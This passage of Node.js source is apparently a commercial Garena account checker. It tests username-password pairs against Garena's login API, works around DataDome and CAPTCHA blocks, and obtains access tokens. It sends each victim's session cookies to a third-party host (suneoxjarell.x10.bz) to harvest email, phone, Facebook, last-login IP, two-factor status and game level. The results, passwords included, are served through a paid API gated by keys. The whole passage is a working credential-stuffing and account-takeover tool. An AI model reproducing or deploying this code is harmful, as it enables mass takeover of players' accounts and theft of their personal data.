            logging.warning(`Manual datadome fetch failed (CAPTCHA) for ${safe_username}: ${manual_datadome_result}`);
            return manual_datadome_result;
        } else if (manual_datadome_result) { // Other errors
            logging.warning(`Manual datadome fetch failed for ${safe_username}: ${manual_datadome_result}.`);
            if (manual_datadome_result.startsWith("[⏱️]") || manual_datadome_result.startsWith("[🔴]") || manual_datadome_result.startsWith("[📉]")) {
                 return manual_datadome_result; // Propagate specific errors
             }
        } else { // Null or empty means specific error like "[⚠️] DATADOME MISSING COOKIE FIELD"
            logging.warning(`Manual datadome fetch for ${safe_username} returned: ${manual_datadome_result || 'null/empty'}`);
            return manual_datadome_result || "[⚠️] DATADOME FETCH FAILED (UNKNOWN REASON)";
        }
    }
    
    const login_params_obj = {
        'app_id': '100082', 'account': account_username, 'password': encryptedpassword,
        'redirect_uri': REDIRECT_URL, 'format': 'json', 'id': _id,
    };
    const login_url_with_params = `${APK_URL}?${urllib.parse.urlencode(login_params_obj)}`;
    let response_login;

    try {
        const cookieString = Object.entries(current_cookies).map(([k, v]) => `${k}=${v}`).join('; ');
        const axiosConfig = { headers: { ...(selected_header || {}), 'Cookie': cookieString }, timeout: timeout * 1000 };
        response_login = await axios.get(login_url_with_params, axiosConfig);
    } catch (e) {
        const { raw: response_text_on_error } = parseAxiosResponseData(e.response?.data, "Login error response");
        if (e.response && e.response.status >= 400 && detect_captcha_in_response(response_text_on_error)) {
             logging.warning(`CAPTCHA in login HTTP error ${e.response.status} for ${safe_username}.`);
             return "[🤖] CAPTCHA DETECTED (LOGIN HTTP ERROR BODY)";
        }
        if (e.code === 'ECONNABORTED') {
            const msg = e.message.toLowerCase();
            if (msg.includes('connect') || msg.includes('connection')) { // Broader check
                logging.error(`Login connection timed out for ${safe_username}.`);
                return "[⏱️] LOGIN CONNECT TIMEOUT";
            }
            logging.error(`Login read timed out for ${safe_username}.`);
            return "[⏱️] LOGIN READ TIMEOUT";
        }
        if (e.isAxiosError && !e.response) {
            logging.error(`Login connection error for ${safe_username}: ${e.message}`);
            return "[🔴] CONNECTION ERROR - SERVER REFUSED/UNREACHABLE";
        }
        if (e.response) {
            const status_code = e.response.status;
            if (status_code === 403) return "[🚫] LOGIN FORBIDDEN (403)";
            if (status_code === 429) return "[🚦] RATE LIMITED (429)";
            logging.warning(`Login HTTP error ${status_code} for ${safe_username}: ${String(response_text_on_error).substring(0,200)}`);
            return `[📉] LOGIN HTTP ERROR ${status_code}`;
        }
        const err_str = strip_ansi_codes(e.message);
        if (detect_captcha_in_response(err_str)) {
            logging.warning(`CAPTCHA during login request error for ${safe_username}: ${err_str}`);
            return "[🤖] CAPTCHA DETECTED (LOGIN REQUEST ERROR MSG)";
        }
        logging.exception(`Login request failed unexpectedly for ${safe_username}:`, e);
        return `[⚠️] LOGIN REQUEST FAILED: ${err_str.substring(0,100)}`;
    }

    const { data: login_json_response, error: login_parse_error, raw: login_raw_text } = parseAxiosResponseData(response_login.data, "Login response");

    if (detect_captcha_in_response(login_raw_text)) {
        logging.warning(`CAPTCHA IN login response (status ${response_login.status}) for ${safe_username}.`);
        return "[🤖] CAPTCHA DETECTED (LOGIN RESPONSE BODY)";
    }
    if (login_parse_error && !login_json_response) {
        logging.error(`Invalid login JSON for ${safe_username}: ${login_raw_text.substring(0,200)}`);
        return `[💢] INVALID LOGIN JSON RESPONSE (PARSE ERROR)`;
    }
    if (!login_json_response) {
        logging.error(`Login response null/undefined for ${safe_username}. Raw: ${login_raw_text.substring(0,200)}`);
        return `[💢] INVALID LOGIN JSON RESPONSE (NULL JSON)`;
    }

    if (login_json_response.error) {
        const error_msg = String(login_json_response.error);
        logging.warning(`Login error field for ${safe_username}: ${error_msg}`);
        if (detect_captcha_in_response(error_msg)) return "[🤖] CAPTCHA REQUIRED (LOGIN ERROR FIELD)";
        if (error_msg.includes("error_password")) return "[⛔] INCORRECT PASSWORD"; 
        if (error_msg.includes("error_account_does_not_exist")) return "[👻] ACCOUNT DOESN'T EXIST";
        if (error_msg.includes("error_account_not_activated")) return "[⏳] ACCOUNT NOT ACTIVATED";
        return `[🚫] LOGIN ERROR: ${error_msg.substring(0, 50)}`;
    }

    if (!login_json_response.session_key) {
         logging.error(`Login response missing session_key for ${safe_username}: ${JSON.stringify(login_json_response).substring(0,200)}`);
         return "[❌] LOGIN FAILED: NO SESSION KEY";
    }

    const session_key = login_json_response.session_key;
    const newCookiesFromLogin = parseSetCookies(response_login.headers['set-cookie']);
    current_cookies = { ...current_cookies, ...newCookiesFromLogin };
    logging.info(`Garena login successful for ${safe_username}.`);
    
    const acc_info_script_headers = {
        'Host': 'account.garena.com', 'Connection': 'keep-alive',
        'User-Agent': (selected_header && selected_header["User-Agent"]) || "Mozilla/5.0",
        'Accept': 'application/json, text/plain, */*',
        'Referer': `https://account.garena.com/?session_key=${session_key}`,
        'Accept-Language': 'en-US,en;q=0.9',
    };
    if (selected_header) {
        for (const key in selected_header) {
            if (key.toLowerCase().startsWith('sec-ch-ua')) acc_info_script_headers[key] = selected_header[key];
        }
    }

    const acc_info_script_url = 'https://suneoxjarell.x10.bz/jajak.php';
    const params_for_acc_info_script = {};
    for (const [k, v] of Object.entries(current_cookies)) { params_for_acc_info_script[`coke_${k}`] = v; }
    for (const [k, v] of Object.entries(acc_info_script_headers)) {
        const safe_k = k.replace(/-/g, '_').toLowerCase();
        params_for_acc_info_script[`hider_${safe_k}`] = v;
    }
    let init_json_response = null;

    try {
        const init_response = await axios.get(acc_info_script_url, { params: params_for_acc_info_script, timeout: timeout * 1000 });
        const { data: parsed_init_data, raw: init_raw_text } = parseAxiosResponseData(init_response.data, "Account info script response");
        
        if (detect_captcha_in_response(init_raw_text)) {
             logging.warning(`CAPTCHA IN account info script response for ${safe_username}.`);
             return "[🤖] CAPTCHA DETECTED (ACC INFO SCRIPT RESPONSE)";
        }
        if (init_response.status < 200 || init_response.status >=300) {
            throw new Error(`Account info script HTTP Error ${init_response.status}. Body: ${init_raw_text.substring(0,150)}`);
        }
        
        if (parsed_init_data) {
            init_json_response = parsed_init_data;
        } else if (init_raw_text) {
             const json_match = /({.*?})/s.exec(init_raw_text); // Try to find JSON in text
             if (json_match && json_match[1]) {
                 try { init_json_response = JSON.parse(json_match[1]); }
                 catch (e) {
                     logging.error(`Failed parsing JSON in acc info script response for ${safe_username}: ${json_match[1].substring(0,200)} - Error: ${e.message}`);
                     return `[🧩] FAILED ACC INFO PARSE (EMBEDDED JSON INVALID)`;
                 }
             } else {
                 logging.error(`Failed parsing acc info for ${safe_username}: ${init_raw_text.substring(0,200)}`);
                 return `[🧩] FAILED ACC INFO PARSE (NO VALID JSON)`;
             }
        } else {
            logging.error(`Account info script empty/unparseable for ${safe_username}. Status: ${init_response.status}`);
            return `[🧩] FAILED ACC INFO PARSE (EMPTY/UNPARSABLE)`;
        }
    } catch (e) {
        const err_str = strip_ansi_codes(e.message);
        const resp_text = strip_ansi_codes(e.response && e.response.data ? String(e.response.data) : "");
        if (detect_captcha_in_response(err_str) || detect_captcha_in_response(resp_text)) {
            logging.warning(`CAPTCHA during acc info script request error for ${safe_username}: ${err_str}`);
            return "[🤖] CAPTCHA DETECTED (ACC INFO SCRIPT REQUEST ERROR)";
        }
        if (e.code === 'ECONNABORTED') {
            logging.error(`Account info script timed out for ${safe_username}`);
            return "[⏱️] ACCOUNT INFO SCRIPT TIMEOUT";
        }
        logging.exception(`Account info script request failed for ${safe_username}:`, e);
        return `[📡] ACC INFO SCRIPT REQUEST FAILED: ${err_str.substring(0,100)}`;
    }

    if (typeof init_json_response !== 'object' || init_json_response === null) {
        logging.error(`Account info processing failed - not an object for ${safe_username}`);
        return "[🧩] FAILED ACC INFO PROCESS (INVALID STRUCTURE)";
    }

    if (init_json_response.error || init_json_response.success === false ) {
        const error_detail = init_json_response.error || init_json_response.message || 'Unknown error from acc info script';
        const clean_error_detail = strip_ansi_codes(String(error_detail));
        logging.warning(`Account info script returned error for ${safe_username}: ${clean_error_detail}`);
        if (detect_captcha_in_response(clean_error_detail)) {
            return "[🤖] CAPTCHA REQUIRED (ACC INFO SCRIPT ERROR FIELD)";
        }
        return `[❓] ACC INFO ERROR: ${clean_error_detail.substring(0,150)}`;
    }
    
    const bindings = init_json_response.bindings || [];
    const account_status = strip_ansi_codes(String(init_json_response.status || 'Unknown'));
    let country = "N/A", last_login = "N/A", last_login_where = "N/A", avatar_url = "N/A";
    let fb_name = "N/A", fb_link = "N/A", mobile = "N/A", email = "N/A";
    let facebook_bound = "False", email_verified = "False", authenticator_enabled = "False", two_step_enabled = "False";
    let shell = "0", ckz_count = "UNKNOWN", last_login_ip = "N/A";

    if (Array.isArray(bindings)) {
        for (const binding_item_str of bindings) {
            const binding_clean = strip_ansi_codes(String(binding_item_str));
            if (binding_clean.includes(":")) {
                try {
                    const [key_raw, ...value_parts] = binding_clean.split(":");
                    const key = key_raw.trim().toLowerCase(); 
                    const value = value_parts.join(":").trim();
                    if (!value) continue; // Skip if value is empty
                    
                    if (key === "country") country = value;
                    else if (key === "lastlogin" && !key.includes("from") && !key.includes("ip")) last_login = value;
                    else if (key === "lastloginfrom") last_login_where = value;
                    else if (key === "lastloginip") last_login_ip = value;
                    else if (key === "ckz") ckz_count = value;
                    else if (key === "garena shells") shell = (/\d+/.exec(value) || ["0"])[0];
                    else if (key === "facebook account" && value !== "N/A") { fb_name = value; facebook_bound = "True"; }
                    else if (key === "fb link") fb_link = value;
                    else if (key === "avatar") avatar_url = value;
                    else if (key === "mobile number" && value !== "N/A") mobile = value;
                    else if (key === "tae") email_verified = value.toLowerCase().includes("yes") ? "True" : "False"; // Email verified
                    else if (key === "eta" && value !== "N/A") email = value; // Email address
                    else if (key === "authenticator") authenticator_enabled = value.toLowerCase().includes("enabled") ? "True" : "False";
                    else if (key === "two-step verification") two_step_enabled = value.toLowerCase().includes("enabled") ? "True" : "False";
                } catch (parse_err) {
                    logging.warning(`Error parsing binding line for ${safe_username}: '${binding_clean.substring(0,50)}...' - ${parse_err.message}`);
                }
            }
        }
    } else {
        logging.warning(`Bindings data not an array for ${safe_username}: ${String(bindings).substring(0,100)}`);
    }
    
    // Normalize country
    if (!country || ["N/A", "UNKNOWN", "NONE", ""].includes(String(country).toUpperCase())) {
        country = "UNKNOWN"; // Default if not found
        if (last_login_where && last_login_where !== "N/A") {
            const llw_upper = last_login_where.toUpperCase();
            const parts = llw_upper.split(',').map(p => p.trim());
            const potential_country_from_llw = parts[parts.length - 1]; // Last part is often country
            const mapped_from_llw = GARENA_COUNTRY_MAP[potential_country_from_llw];
            if (mapped_from_llw) country = mapped_from_llw;
            else { // Check other parts if last one didn't match
                for (const p_part of parts) {
                    if (GARENA_COUNTRY_MAP[p_part]) { country = GARENA_COUNTRY_MAP[p_part]; break; }
                }
            }
        }
    } else {
        const normalized = GARENA_COUNTRY_MAP[String(country).toUpperCase()];
        country = normalized || String(country).toUpperCase(); // Use mapped or original uppercase
    }
    
    const grant_cookies = {};
    ['datadome', 'sso_key'].forEach(key => { // Only specific cookies for grant
        if (current_cookies[key]) grant_cookies[key] = current_cookies[key];
    });

    const grant_headers = {
        "Host": "auth.garena.com", "Connection": "keep-alive",
        "Accept": "application/json, text/plain, */*",
        "Content-Type": "application/x-www-form-urlencoded;charset=UTF-8",
        "Origin": "https://auth.garena.com", "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-Mode": "cors", "Sec-Fetch-Dest": "empty",
        "Referer": "https://auth.garena.com/universal/oauth?all_platforms=1&response_type=token&locale=en-SG&client_id=100082&redirect_uri=" + urllib.parse.quote(REDIRECT_URL),
        "Accept-Encoding": "gzip, deflate, br, zstd", "Accept-Language": "en-US,en;q=0.9",
        "User-Agent": (selected_header && selected_header["User-Agent"]) || "Mozilla/5.0",
    };
    if (selected_header) {
        for (const key in selected_header) {
            if (key.toLowerCase().startsWith('sec-ch-ua')) grant_headers[key] = selected_header[key];
        }
    }
    const grant_data_payload_obj = {"client_id": "100082", "response_type": "token", "redirect_uri": REDIRECT_URL, "format": "json", "id": _id};
    const grant_data_payload_str = urllib.parse.urlencode(grant_data_payload_obj);
    let grant_response;

    try {
        const grant_url = "https://auth.garena.com/oauth/token/grant";
        const cookieStringGrant = Object.entries(grant_cookies).map(([k, v]) => `${k}=${v}`).join('; ');

        grant_response = await axios.post(grant_url, grant_data_payload_str, {
            headers: { ...grant_headers, 'Cookie': cookieStringGrant }, timeout: timeout * 1000
        });
        
        const { data: grant_data_json, error: grant_parse_error, raw: grant_raw_text } = parseAxiosResponseData(grant_response.data, "Grant token response");

        if (detect_captcha_in_response(grant_raw_text)) {
            logging.warning(`CAPTCHA IN grant token response for ${safe_username}.`);
            return "[🤖] CAPTCHA DETECTED (GRANT TOKEN RESPONSE BODY)";
        }
        if (grant_parse_error && !grant_data_json) {
            logging.error(`Invalid grant token JSON for ${safe_username}: ${grant_raw_text.substring(0,200)}`);
            return `[📄] GRANT TOKEN FAILED: NON-JSON RESPONSE (${grant_parse_error.message.substring(0,50)})`;
        }
        if (!grant_data_json) { // Should be caught by parse_error usually
            logging.error(`Grant token response null/undefined for ${safe_username}. Raw: ${grant_raw_text.substring(0,200)}`);
            return `[📄] GRANT TOKEN FAILED: NULL JSON RESPONSE`;
        }

        if (grant_data_json.error) {
            const error_msg = String(grant_data_json.error);
            logging.warning(`Grant token error field for ${safe_username}: ${error_msg}`);
            if (detect_captcha_in_response(error_msg)) return "[🤖] CAPTCHA REQUIRED (GRANT TOKEN ERROR FIELD)";
            return `[🔑] GRANT TOKEN FAILED: ${error_msg.substring(0,50)}`;
        }

        if (!grant_data_json.access_token) {
            logging.error(`Grant token response missing access_token for ${safe_username}: ${JSON.stringify(grant_data_json).substring(0,200)}`);
            return "[❓] GRANT TOKEN MISSING 'access_token'";
        }

        const access_token = grant_data_json.access_token;
        const newCookiesFromGrant = parseSetCookies(grant_response.headers['set-cookie']);
        current_cookies = { ...current_cookies, ...newCookiesFromGrant }; // Update main cookie bag
        logging.info(`Access token granted for ${safe_username}.`);
        
        const codm_check_cookies = {}; // Cookies specifically for CODM check
        ['datadome', 'sso_key', 'token_session'].forEach(key => { // token_session might be set by grant
            if (current_cookies[key]) codm_check_cookies[key] = current_cookies[key];
        });
        
        const codm_result_str = await show_level(access_token, selected_header, codm_check_cookies, timeout);

        if (codm_result_str.startsWith("[🤖]")) {
             logging.warning(`CODM check returned CAPTCHA for ${safe_username}: ${codm_result_str}`);
             return codm_result_str; // Propagate CAPTCHA
        }
        // Test for CODM failure/warning patterns more robustly
        if (/^\[(CODM FAIL|CODM WARN|⏱️)\]/.test(codm_result_str)) {
            logging.warning(`CODM check failed/warned for ${safe_username}: ${codm_result_str}`);
            // Return a structured error for partial success
            return ["CODM_FAILURE", account_username, password_for_result, codm_result_str];
        }

        let codm_nickname = "N/A", codm_level_str = "N/A", codm_region = "N/A", uid = "N/A";
        const connected_games_list_for_json = [];

        // Parse CODM result string if it's not an error marker
        if (typeof codm_result_str === 'string' && codm_result_str.includes("|") && codm_result_str.split("|").length === 4) {
            const parts = codm_result_str.split("|");
            [codm_nickname, codm_level_str, codm_region, uid] = parts.map(p => p.trim());
            
            // Validate parsed parts
            if (/^\d+$/.test(codm_level_str) && codm_nickname && codm_region && uid &&
               ![codm_nickname, codm_region, uid].some(p => !p || p.toLowerCase() === "n/a")) {
                connected_games_list_for_json.push({
                    "game": "CODM", "region": codm_region, "level": codm_level_str,
                    "nickname": codm_nickname, "uid": uid
                });
            } else {
                const reason = `[CODM WARN] PARSED INVALID CODM DATA FROM SCRIPT: ${codm_result_str.substring(0,100)}`;
                logging.warning(`CODM check for ${safe_username}: ${reason}`);
                return ["CODM_FAILURE", account_username, password_for_result, reason];
            }
        } else { // If not matching format, and not an error handled above, it's unexpected
            const reason = `[CODM WARN] UNEXPECTED CODM DATA FORMAT: ${String(codm_result_str).substring(0,100)}`;
            logging.warning(`CODM check for ${safe_username}: ${reason}`);
            return ["CODM_FAILURE", account_username, password_for_result, reason];
        }
        
        const result_dict = format_result_dict(
            last_login, last_login_where, country, shell, avatar_url, mobile,
            facebook_bound, email_verified, authenticator_enabled, two_step_enabled,
            connected_games_list_for_json, fb_name, fb_link, email, date, // 'date' is date_timestamp_for_check
            account_username, password_for_result,
            ckz_count, last_login_ip, account_status
        );
        logging.info(`Full check successful for ${safe_username}. CODM Level: ${codm_level_str}`);
        return result_dict;

    } catch (e) { // Catch errors from the grant token request block
        const { raw: grant_text_on_error } = parseAxiosResponseData(e.response?.data, "Grant token error response");
        const err_str = strip_ansi_codes(e.message);
        
        if (detect_captcha_in_response(err_str) || detect_captcha_in_response(grant_text_on_error)) {
            logging.warning(`CAPTCHA during grant token request error for ${safe_username}: ${err_str}`);
            return "[🤖] CAPTCHA DETECTED (GRANT TOKEN REQUEST ERROR)";
        }
        if (e.code === 'ECONNABORTED') { // Axios timeout
            logging.error(`Grant token request timed out for ${safe_username}`);
            return "[⏱️] GRANT TOKEN REQUEST TIMEOUT";
        }
        logging.exception(`Grant token request error for ${safe_username}:`, e); // Log full exception
        return `[🌐] GRANT TOKEN REQUEST ERROR: ${err_str.substring(0,100)}`;
    }
}

function format_result_dict(last_login, last_login_where, country, shell_str, avatar_url, mobile,
                       facebook_bound_str, email_verified_str, authenticator_enabled_str, two_step_enabled_str,
                       connected_games_data, fb_name, fb_link, email, date_timestamp,
                       username, password, /* This password is for result, API handler should remove it */
                       ckz_count, last_login_ip, account_status) {
    
    let codm_info_json = {"status": "NO CODM INFO PARSED", "level": null}; // Default
    if (Array.isArray(connected_games_data) && connected_games_data.length > 0) {
        const game_data = connected_games_data[0]; // Assuming only one CODM game entry
        if (game_data && game_data.game === "CODM") {
            let level_val = null;
            try { level_val = parseInt(game_data.level, 10); if(isNaN(level_val)) level_val = null; }
            catch (e) { /* ignore parse error, level_val remains null */ }
            
            codm_info_json = { // Structure for successful CODM parse
                "status": "LINKED", "game": "CODM", 
                "region": game_data.region || null,
                "level": level_val, 
                "nickname": game_data.nickname || null, 
                "uid": game_data.uid || null
            };
        }
    }

    let shell_value = 0;
    try { shell_value = parseInt(shell_str, 10); if(isNaN(shell_value)) shell_value = 0; }
    catch (e) { /* ignore parse error, shell_value remains 0 */ }

    function clean_na(value) { // Helper to convert "N/A" or empty to null
        const sVal = String(value);
        return (value && !["N/A", "UNKNOWN", ""].includes(sVal.toUpperCase())) ? value : null;
    }

    const result_data = {
        "checker_by": "S1N | TG: @YISHUX",
        "timestamp_utc": DateTime.now().toISO(),
        "check_run_id": date_timestamp, // Original timestamp for the check run
        "username": username, 
        "password": password, // IMPORTANT: This should be removed by the API handler before sending to client
        "account_status_garena": clean_na(account_status),
        "account_country": clean_na(country),
        "garena_shells": shell_value,
        "avatar_url": clean_na(avatar_url),
        "last_login_time": clean_na(last_login),
        "last_login_location": clean_na(last_login_where),
        "last_login_ip": clean_na(last_login_ip),
        "bindings": {
            "mobile_number": clean_na(mobile),
            "email_address": clean_na(email),
            "facebook_name": clean_na(fb_name),
            "facebook_link": clean_na(fb_link),
        },
        "security": {
            "mobile_bound": !!clean_na(mobile), // Boolean based on presence
            "email_verified": email_verified_str === "True",
            "facebook_linked": facebook_bound_str === "True",
            "google_authenticator_enabled": authenticator_enabled_str === "True",
            "two_step_verification_enabled": two_step_enabled_str === "True",
        },
        "codm_details": codm_info_json,
        "ckz_count": ckz_count !== "UNKNOWN" ? clean_na(ckz_count) : null,
    };
    return result_data;
}

async function check_account(username, password, date_timestamp, initial_cookies_tuple, datadome_for_prelogin_attempt = null, timeout = REQUEST_TIMEOUT) {
    const safe_username = String(username || "UNKNOWN_USER").substring(0, 5);
    try {
        const random_id = String(random.randint(100000000000, 999999999999));
        const [initial_cookies_from_system, headers_template] = get_request_data(initial_cookies_tuple); 
        let prelogin_request_cookies = { ...initial_cookies_from_system }; // Start with system cookies

        if (datadome_for_prelogin_attempt) { // If a datadome is passed (e.g. from a retry)
            prelogin_request_cookies['datadome'] = datadome_for_prelogin_attempt;
        }
        // Else, prelogin will attempt without one, or rely on one in initial_cookies_from_system

        const params_obj_prelogin = {"app_id": "100082", "account": username, "format": "json", "id": random_id};
        const prelogin_url = "https://auth.garena.com/api/prelogin";
        let v1 = null, v2 = null;
        let datadome_from_prelogin_response = null; // To capture datadome from prelogin's Set-Cookie
        let response_prelogin = null;

        try {
            const cookieStringPrelogin = Object.entries(prelogin_request_cookies).map(([k, v]) => `${k}=${v}`).join('; ');
            response_prelogin = await axios.get(prelogin_url, {
                params: params_obj_prelogin,
                headers: { ...(headers_template || {}), 'Cookie': cookieStringPrelogin },
                timeout: timeout * 1000
            });
            
            // Capture datadome from Set-Cookie header of prelogin response
            const newCookiesFromPrelogin = parseSetCookies(response_prelogin.headers['set-cookie']);
            if (newCookiesFromPrelogin['datadome']) {
                datadome_from_prelogin_response = newCookiesFromPrelogin['datadome'];
            }
        } catch (e) {
            const { raw: prelogin_text_on_error } = parseAxiosResponseData(e.response?.data, "Prelogin error response");
            if (e.response && e.response.status >= 400 && detect_captcha_in_response(prelogin_text_on_error)) {
                 logging.warning(`CAPTCHA in prelogin HTTP error ${e.response.status} for ${safe_username}.`);
                 return "[🤖] CAPTCHA DETECTED (PRELOGIN HTTP ERROR BODY)";
            }
            if (e.code === 'ECONNABORTED') {
                logging.error(`Prelogin timed out for ${safe_username}: ${e.message}`);
                return "[⏱️] PRELOGIN TIMED OUT";
            }
            if (e.response) { // Other HTTP errors
                 const status_code = e.response.status;
                 if (status_code === 403) return `[🚫] PRELOGIN FORBIDDEN (403)`;
                 if (status_code === 429) return "[🚦] PRELOGIN RATE LIMITED (429)";
                 logging.warning(`Prelogin HTTP error ${status_code} for ${safe_username}: ${String(prelogin_text_on_error).substring(0,200)}`);
                 return `[📉] PRELOGIN HTTP ERROR ${status_code}`; // Generic HTTP error
            }
            // Non-HTTP errors (network, DNS, etc.)
            const err_str = strip_ansi_codes(e.message);
            if (detect_captcha_in_response(err_str)) { // Less likely here but possible
                 logging.warning(`CAPTCHA during prelogin request error (non-HTTP) for ${safe_username}: ${err_str}`);
                 return "[🤖] CAPTCHA DETECTED (PRELOGIN REQUEST ERROR MSG)";
            }
            logging.exception(`Prelogin request failed unexpectedly for ${safe_username}:`, e);
            return `[🔌] PRELOGIN REQUEST FAILED (NETWORK/OTHER): ${err_str.substring(0,100)}`;
        }

        const { data: data_prelogin, error: prelogin_parse_error, raw: prelogin_raw_text } = parseAxiosResponseData(response_prelogin.data, "Prelogin response");

        if (detect_captcha_in_response(prelogin_raw_text)) {
            logging.warning(`CAPTCHA IN prelogin response (status ${response_prelogin.status}) for ${safe_username}.`);
            return "[🤖] CAPTCHA DETECTED (PRELOGIN RESPONSE BODY)";
        }
        if (prelogin_parse_error && !data_prelogin) { // JSON parsing failed
            logging.error(`Invalid prelogin JSON for ${safe_username}: ${prelogin_raw_text.substring(0,200)}`);
            return `[🧩] INVALID PRELOGIN JSON (PARSE ERROR)`;
        }
        if (!data_prelogin) { // Response was not valid JSON or empty
            logging.error(`Prelogin response null/undefined for ${safe_username}. Raw: ${prelogin_raw_text.substring(0,200)}`);
            return `[🧩] INVALID PRELOGIN JSON (NULL JSON)`;
        }

        if (data_prelogin.error) {
            const error_msg = String(data_prelogin.error);
            logging.warning(`Prelogin error field for ${safe_username}: ${error_msg}`);
            if (detect_captcha_in_response(error_msg)) return "[🤖] CAPTCHA REQUIRED (PRELOGIN ERROR FIELD)";
            if (error_msg === 'error_account_does_not_exist') return "[👻] ACCOUNT DOESN'T EXIST";
            // Other specific errors from prelogin can be handled here
            return `[❗] PRELOGIN ERROR: ${error_msg.substring(0,50)}`;
        }

        v1 = data_prelogin.v1;
        v2 = data_prelogin.v2;
        if (!v1 || !v2) { // Essential for password encryption
            logging.error(`Prelogin data missing v1/v2 for ${safe_username}: ${JSON.stringify(data_prelogin).substring(0,200)}`);
            return "[⚠️] PRELOGIN DATA MISSING (V1/V2)";
        }

        const encrypted_password_val = get_encrypted_password(password, v1, v2);
        
        // Determine datadome for the next (login) step:
        // Priority: 1. From prelogin Set-Cookie, 2. Passed in (retry), 3. From initial system cookies
        let datadome_for_login_step = null;
        if (datadome_from_prelogin_response && typeof datadome_from_prelogin_response === 'string' &&
           !/^\[[🤖⚠️]\]/.test(datadome_from_prelogin_response)) { // Valid datadome from prelogin
            datadome_for_login_step = datadome_from_prelogin_response;
            save_datadome_to_storage(datadome_for_login_step); // Save if new
        } else if (datadome_for_prelogin_attempt) { // Fallback to passed-in datadome
            datadome_for_login_step = datadome_for_prelogin_attempt;
        }
        // If still null, check_login will try to fetch one if its own `dataa_datadome` param is null.
        
        // Prepare cookies for the actual login step
        let login_step_cookies = { ...initial_cookies_from_system };
        // Merge cookies from prelogin response (excluding datadome, handled by datadome_for_login_step)
        if (response_prelogin && response_prelogin.headers['set-cookie']) {
            const newCookiesFromPreloginAgain = parseSetCookies(response_prelogin.headers['set-cookie']);
            for (const cookieName in newCookiesFromPreloginAgain) {
                if (cookieName.toLowerCase() !== 'datadome') { // Merge other cookies
                    login_step_cookies[cookieName] = newCookiesFromPreloginAgain[cookieName];
                }
            }
        }
        // Ensure datadome_for_login_step is used if available, otherwise check_login's logic will fetch one.
        // The `dataa_datadome` parameter in `check_login` will use this.
        
        return await check_login(
            username, random_id,
            encrypted_password_val,
            password, // Original password for final result formatting
            headers_template, 
            login_step_cookies, // Cookies accumulated so far
            datadome_for_login_step, // Explicit datadome for login step
            date_timestamp, 
            timeout
        );

    } catch (e) { // Catch-all for unexpected errors within check_account itself
        const err_str = strip_ansi_codes(e.message);
        if (detect_captcha_in_response(err_str)) {
            logging.warning(`CAPTCHA during unexpected error in check_account for ${safe_username}.`);
            return "[🤖] CAPTCHA DETECTED (check_account UNEXPECTED)";
        }
        if (e instanceof ReferenceError && (e.message.includes('encrypted_password') || e.message.includes('encryptedpassword'))) {
            logging.critical(`CRITICAL: Password encryption variable not defined in check_account for ${safe_username}. Error: ${e.message}`, e);
            return "[💥] INTERNAL ERROR: PASSWORD ENCRYPTION STATE INVALID.";
        }
        logging.exception(`Unexpected error in check_account for ${safe_username}:`, e);
        return `[💥] UNEXPECTED ERROR (check_account): ${err_str.substring(0,100)}`;
    }
}

function htmlEscape(text) { // Basic HTML escaping for error messages displayed in console
    if (typeof text !== 'string') return String(text);
    return text.replace(/&/g, '&').replace(/</g, '<').replace(/>/g, '>').replace(/"/g, '"').replace(/'/g, `'`);
}

// --- Express API Setup ---
const express = require('express');
// Assuming api_keys_manager.js is in the same directory or correctly pathed
const apiKeyManager = require('./api_keys_manager'); 
const app = express();
const PORT = parseInt(process.env.PORT, 10) || 3000;

app.use(express.json({ limit: '1mb' })); // For admin endpoints that might use JSON body
app.use(express.urlencoded({ extended: true, limit: '1mb' })); // For admin endpoints

const apiKeyMiddleware = async (req, res, next) => {
    // API key can be in query, body (for POST admin actions), or header
    const apiKeyInput = req.query.apikey || req.body.apikey || req.headers['x-api-key'];
    const apiKeyPreview = (typeof apiKeyInput === 'string' && apiKeyInput.length > 0) 
        ? `${apiKeyInput.substring(0, Math.min(5, apiKeyInput.length))}...` : '[EMPTY/INVALID_KEY]';

    if (!apiKeyInput || typeof apiKeyInput !== 'string') {
        logging.warning(`API call to ${req.path} with missing/invalid API key. Preview: ${apiKeyPreview}`);
        return res.status(401).json({ error: "API key required (string)." });
    }

    try {
        const validationResult = await apiKeyManager.validateAndConsumeApiKey(apiKeyInput);
        if (!validationResult || !validationResult.valid) {
            const message = (validationResult && validationResult.message) ? validationResult.message : "API key validation failed.";
            const status = (validationResult && validationResult.status) ? validationResult.status : 403; // Default to 403
            logging.warning(`API key validation failed for '${apiKeyPreview}' on ${req.path}: ${message}`);
            return res.status(status).json({ error: message });
        }
        req.apiKeyData = validationResult.keyData; // Attach validated key data to request
        logging.info(`API key '${apiKeyPreview}' (User: ${validationResult.keyData.userId}, Tier: ${validationResult.keyData.tierName}) validated for ${req.path}. Usage: ${validationResult.keyData.checksMade || 0}/${validationResult.keyData.checkLimit || 'N/A'}`);
        next();
    } catch (error) {
        logging.exception(`Error during API key validation for '${apiKeyPreview}' on ${req.path}:`, error);
        res.status(500).json({ error: "Internal error during API key validation." });
    }
};

const ADMIN_MASTER_KEY = process.env.ADMIN_MASTER_KEY || "sinluna"; // Stronger default reminder

const adminAuthMiddleware = (req, res, next) => {
    const masterKey = req.headers['x-admin-key'];
    if (masterKey === ADMIN_MASTER_KEY) {
        next();
    } else {
        logging.warning(`Admin endpoint access denied. Path: ${req.path}. Key: ${masterKey ? masterKey.substring(0,3)+'...' : 'N/A'}`);
        res.status(403).json({ error: "Forbidden: Admin access required." });
    }
};

// Changed to GET only for /api/check
app.get('/api/check', apiKeyMiddleware, async (req, res) => {
    // Parameters from query string for GET request
    const user = req.query.user;
    const pass = req.query.password;

    const safeUser = String(user || "").substring(0,3);
    logging.info(`/api/check called by user ${req.apiKeyData.userId} (key ID: ${req.apiKeyData.apiKey.substring(0,5)}...). Checking Garena user: ${safeUser}...`);

    if (!user || !pass) {
        logging.warning(`/api/check: Missing user/password for Garena user ${safeUser}.`);
        return res.status(400).json({ error: "Query parameters 'user' and 'password' are required." });
    }
    if (typeof user !== 'string' || typeof pass !== 'string') {
        logging.warning(`/api/check: User/password not strings for Garena user ${safeUser}.`);
        return res.status(400).json({ error: "'user' and 'password' must be strings." });
    }

    try {
        const date_timestamp_for_check = get_current_timestamp();
        const session_initial_cookies_tuple = starting_cookies(); // Gets [cookies, source_message]
        
        const result = await check_account(
            user,
            pass,
            date_timestamp_for_check,
            session_initial_cookies_tuple,
            null, // datadome_for_prelogin_attempt (initial call, none)
            REQUEST_TIMEOUT
        );

        if (typeof result === 'object' && result !== null && !Array.isArray(result)) { // Full success
